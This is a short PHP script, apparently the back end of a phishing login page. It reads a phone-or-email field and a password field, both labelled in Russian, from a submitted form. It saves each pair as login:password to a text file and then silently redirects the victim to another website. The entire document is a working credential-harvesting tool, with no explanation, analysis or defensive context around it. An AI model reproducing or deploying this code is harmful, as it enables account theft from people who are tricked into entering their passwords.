$Log = $_POST['Телефон или Email'];
 
$Pass = $_POST['пароль'];
 
$log = fopen("LOX.txt","at");
 
fwrite($log,"\n $Log:$Pass \n");
 
fclose($log);
 
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://lleo.aha.ru/na/'></head></html>";
 